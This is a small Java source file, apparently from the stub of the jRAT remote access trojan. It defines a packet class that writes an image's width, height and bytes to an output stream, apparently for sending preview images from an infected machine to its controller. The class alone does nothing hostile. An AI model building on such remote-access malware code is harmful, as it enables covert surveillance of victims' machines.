package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet43PreviewImage extends AbstractOutgoingPacket {

	private byte[] buffer;
	private int width;
	private int height;

	public Packet43PreviewImage(byte[] buffer, int width, int height) {
		this.buffer = buffer;
		this.width = width;
		this.height = height;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(width);
		dos.writeInt(height);
		dos.writeInt(buffer.length);
		dos.write(buffer);
	}

	@Override
	public byte getPacketId() {
		return 43;
	}

}
